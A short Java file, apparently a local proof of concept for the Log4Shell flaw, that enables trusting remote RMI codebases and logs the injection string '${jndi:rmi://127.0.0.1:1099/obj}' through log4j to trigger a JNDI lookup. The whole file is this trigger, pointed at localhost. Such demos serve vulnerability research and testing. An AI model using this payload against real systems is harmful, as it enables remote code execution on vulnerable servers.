package com.adun;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author Zhu Dunfeng
 * @date 2021/12/13 12:28
 */
public class Application {
    private static final Logger logger=LogManager.getLogger(Application.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String name = "${jndi:rmi://127.0.0.1:1099/obj}";
        logger.info("{}",name);
    }

}
